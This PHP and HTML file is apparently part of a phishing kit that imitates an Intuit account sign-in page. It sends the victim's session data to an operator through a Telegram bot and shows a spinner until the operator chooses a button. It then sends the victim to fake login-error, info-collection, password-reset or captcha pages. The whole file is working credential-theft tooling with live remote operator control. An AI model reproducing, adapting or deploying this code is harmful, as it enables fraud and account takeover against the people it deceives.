<?php
session_start();
ob_start(); 
require_once('includes/php/detect.php');
require_once('config2.php');

if (!function_exists('curl_init')) {
  die('Error: cURL must be enabled on the server.');
}

if(!isset($_SESSION['username'])) $_SESSION['username'] = true;


$_SESSION['unique_id'] = bin2hex(random_bytes(16));

$adddate=date("D M d, Y g:i a");
  
if ($live_control['access_manipulation'] === true) {

    $btnRcap = array(
        array(
            array('text' => 'LOGIN ERROR ⛔', 'callback_data' => $_SESSION['unique_id'] . ' error'),
        ),
        array(
            array('text' => 'PROCEED TO INFO 📲', 'callback_data' => $_SESSION['unique_id'] . ' info'),
          ),
        array(
          array('text' => 'FORGOT PASS ♻️', 'callback_data' => $_SESSION['unique_id'] . ' fgpass'),
        ),
        array(
            array('text' => 'Request Captcha ♻️', 'callback_data' => $_SESSION['unique_id'] . ' captcha_check'),
          ),
      );
  
    $buttons = array(
        'inline_keyboard' => $btnRcap
    );
  
  include_once('includes/php/bot_api.php');

$message = '📦 <code>'.$_SESSION['user_data']['query'].'</code>  <code>'.$_SESSION['username'].'</code> <b>is waiting</b>
<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>

<b>USER  '.$_SESSION['username'].'</b>
<b>SELECT NEXT PAGE..</b>
<b>DATE:</b> '.$adddate.'';

  $status = bot_api($message, $buttons);
  if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');
}elseif($live_control['access_auto'] == 'captcha'){
  header('location: cra/2fa.php');
  exit();
}else{
  header('location: cra/access_check.php');
  exit();
}
?>

<!doctype html>
<html lang="en" data-shell-version="6.364.0-master-bld.1303-61353769-1303">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      <title>Intuit Accounts - Sign In</title>
      
      
      <link rel="preload stylesheet" as="style" href="./css/spin.css" crossorigin="anonymous"/>
      
      
      
   </head>
   <body>
      <div id="web-shell-spinner">
         <div class="idsTSIShortSpinner IndeterminateShort-wrapper">
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            
         </div>
      </div>
         <?php
    require_once('includes/js/startRequest.php'); 
    require_once('includes/js/makeRequest.php'); 
    ?>
    <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> error" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> info" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> fgpass" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> captcha_check")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "error") {
            window.location.href = "cra/loginerr.php"; 
            console.log("Login error!");
        } else if (action === "info") {
            window.location.href = "cra/register.php"; 
            console.log("info page!");
        } else if (action === "fgpass") {
            window.location.href = "cra/forgotpass.php"; 
            console.log("captcha check!");
        } else if (action === "captcha_check") {
            window.location.href = "cra/captcha.php"; 
            console.log("captcha check!");
        } 

          break;
        }
      }
    }
  </script>
  <?php require_once('includes/js/deleteMessage.php'); ?>
   </body>
</html>
